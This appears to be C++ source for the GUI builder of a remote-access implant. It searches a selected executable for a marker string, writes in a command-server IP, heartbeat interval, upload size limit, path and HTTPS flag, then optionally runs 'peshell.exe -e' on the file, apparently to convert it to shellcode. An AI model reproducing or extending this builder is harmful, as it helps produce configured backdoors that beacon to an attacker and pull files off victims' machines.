

#include <windows.h>
#include "resource.h"

#include <iostream>
#include <vector>
#include "dialog.h"
#include "dialog.h"
#include "FileHelper.h"
#include "utils.h"


using namespace std;


MyDialog* g_mydialog = 0;


MyDialog::MyDialog() {

}

MyDialog::~MyDialog() {

}

//USER APPDATA

string selectFileName() {
	int ret = 0;
	OPENFILENAMEA opfn = { 0 };
	CHAR file_name[0x1000];
	opfn.lStructSize = sizeof(OPENFILENAMEA);
	opfn.lpstrFilter = "所有文件\0*.*\0\0";
	//指向一对以空字符结束的过滤字符串的一个缓冲。缓冲中的最后一个字符串必须以两个  NULL字符结束。
	opfn.nFilterIndex = 1;			//指定在文件类型控件中当前选择的过滤器的索引
	opfn.lpstrFile = file_name;
	opfn.lpstrFile[0] = '\0';		//这个缓冲的第一个字符必须是NULL
	opfn.nMaxFile = sizeof(file_name);
	opfn.Flags = 0;					//OFN_FILEMUSTEXIST OFN_PATHMUSTEXIST指定用户仅可以在文件名登录字段中输入已存在的文件的名字。	
	ret = GetOpenFileNameA(&opfn);
	if (ret)
	{
		return string(file_name);
	}
	return "";
}

int writeRunningParams(string filename,char * ip,char * hbi,char * uploadsize,char * path,int bhttps,int shell) {

	int ret = 0;
	char* file = 0;
	int filesize = 0;

	ret = FileHelper::fileReader(filename.c_str(), &file, &filesize);
	if (ret)
	{

		const char * tag = "0123456789abcdef";
		INT taglen = lstrlenA(tag);
		int pos = 0;
		int blocksize = MAX_PATH;
		pos = binarySearch(file, filesize, (char*)tag, taglen);	
		if (pos != -1)
		{
			PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(file + pos + taglen);
			memset(params, 0, blocksize);
			params->ip = inet_addr(ip);
			if (params->ip == -1)
			{
				return FALSE;
			}

			params->fzLimit = atoi(uploadsize);
			if (params->fzLimit == 0)
			{
				return FALSE;
			}
			params->hbi = atoi(hbi);
			if (params->hbi == 0)
			{
				return FALSE;
			}
			params->bHttps = bhttps;

			lstrcpyA(params->path, path);

			ret = FileHelper::fileWriter(filename.c_str(), file, filesize, FILE_WRITE_NEW);

			if (shell)
			{
				string cmd = string("peshell.exe -e ") +  filename + " " + path ;
				ret = WinExec(cmd.c_str(), SW_SHOW);
			}

			return ret;
		}
	}

	return 0;
}



int __stdcall MyDialog::runDialog(MyDialog* dialog) {
	int ret = 0;

#define _DIALOG_BOX
#ifdef _DIALOG_BOX
	dialog->m_hwnd = (HWND)DialogBoxParamA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
#else
	//dialog->m_hwnd = CreateDialogIndirectParamA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
	//dialog->m_hwnd = CreateDialogParamA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
	dialog->m_hwnd = CreateDialogA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
	if (dialog->m_hwnd == 0)
	{
		ret = GetLastError();
		return FALSE;
	}

	ret = ShowWindow(dialog->m_hwnd, SW_SHOW);

	MSG msg;
	while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {

		if (ret == -1) {
			return -1;
		}

		if (ret == 0)
		{
			break;
		}

		ret = IsDialogMessage(dialog->m_hwnd, &msg);
		if (ret)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	if (g_mydialog) {
		delete g_mydialog;
		g_mydialog = 0;
	}
#endif


	return 0;
}


INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
{
	if (msg == WM_INITDIALOG)
	{
		//must be in WM_INITDIALOG or WM_CREATE

		DragAcceptFiles(hwnd, TRUE);
	}
	else if (msg == WM_DROPFILES)
	{
		HDROP hdrop = (HDROP)wparam;
		char sDropFilePath[0x1000];
		int iDropFileNums = 0;
		iDropFileNums = DragQueryFileA(hdrop, 0xFFFFFFFF, NULL, 0);
		for (int i = 0; i < iDropFileNums; i++)
		{
			int len = DragQueryFileA(hdrop, i, sDropFilePath, sizeof(sDropFilePath));
			SetDlgItemTextA(hwnd, IDC_EDIT5, sDropFilePath);
		}

		//DragQueryFile(hdrop, 0, sDropFilePath, MAX_PATH);
		DragFinish(hdrop);	 
	}
	else if ((msg & 0xffff) == WM_COMMAND)
	{
		int wl = wparam & 0xffff;
		int wh = wparam >> 16;
		int ll = lparam & 0xffff;
		int lh = lparam >> 16;
		if (wparam == IDOK)
		{
			int ret = 0;
			int len = 0;
			char fn[0x1000];
			char info[1024];
			len = GetDlgItemTextA(hwnd, IDC_EDIT5, fn,sizeof(fn));
			if (len )
			{
				char szip[64];
				len = GetDlgItemTextA(hwnd, IDC_EDIT1, szip, sizeof(szip));
				if (len > 0)
				{
					DWORD ip = inet_addr(szip);
					if (ip != -1)
					{
						char szhbi[16];
						len = GetDlgItemTextA(hwnd, IDC_EDIT3, szhbi, sizeof(szhbi));
						if (len > 0)
						{
						}
						else {
							wsprintfA(szhbi, "%d", HEART_BEAT_INTERVAL);
						}

						char szfz[256];
						len = GetDlgItemTextA(hwnd, IDC_EDIT2, szfz, sizeof(szfz));
						if (len > 0)
						{

						}
						else {
							wsprintfA(szfz, "%d", MAX_UPLOAD_FILESIZE);
						}

						char szdir[MAX_PATH];
						len = GetDlgItemTextA(hwnd, IDC_EDIT4, szdir, sizeof(szdir));
						if (len > 0)
						{

						}
						else {
						}

						int https = IsDlgButtonChecked(hwnd, IDC_CHECK1);

						int shell = IsDlgButtonChecked(hwnd, IDC_CHECK2);

						ret = writeRunningParams(fn, szip, szhbi, szfz, szdir, https,shell);
						if (ret == 0)
						{
							wsprintfA(info, "Write File error:%d", GetLastError());
							MessageBoxA(0, info, info, MB_OK);
						}
						else {

						}	
					}
					else {
						MessageBoxA(0, "error:ip format error", "error:ip format error", MB_OK);
					}
				}
				else {
					MessageBoxA(0, "error:server ip is null", "error:server ip is null", MB_OK);
				}
			}
			else {
				MessageBoxA(0, "error:no file selected", "error:no file selected", MB_OK);
			}
		}else if (wparam == IDC_BUTTON1)
		{
			string fn = selectFileName();

			int ret = SetDlgItemTextA(hwnd, IDC_EDIT5, fn.c_str());
		}
	}
	else if (msg == WM_SYSCOMMAND)
	{
		int wl = wparam & 0xffff;
		int wh = wparam >> 16;
		int ll = lparam & 0xffff;
		int lh = lparam >> 16;
	}
	else if (msg == WM_CLOSE)
	{
		EndDialog(hwnd, 0);
		DestroyWindow(hwnd);
		return 0;
	}
	else if (msg == WM_DESTROY)
	{
		PostQuitMessage(-1);
		return 0;
	}
	else if (msg == WM_QUIT)
	{
		printf("hello\r\n");
	}
	else if (msg == WM_CHAR)
	{
		printf("hello\r\n");
	}
	else if (msg == WM_KEYDOWN)
	{
	printf("hello\r\n");
	}
	else if (msg == WM_RBUTTONDOWN)
	{

	}
	else if (msg == WM_LBUTTONDOWN)
	{

	}
	return FALSE;
	//return DefWindowProc(hwnd,msg,wparam,lparam);
}


int createDialog(HINSTANCE hinstance) {
	g_mydialog = new MyDialog();
	g_mydialog->m_hinst = hinstance;

	g_mydialog->runDialog(g_mydialog);

// 	HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)g_mydialog->runDialog, g_mydialog, 0, 0);
// 	if (h)
// 	{
// 		CloseHandle(h);
// 	}
	return TRUE;
}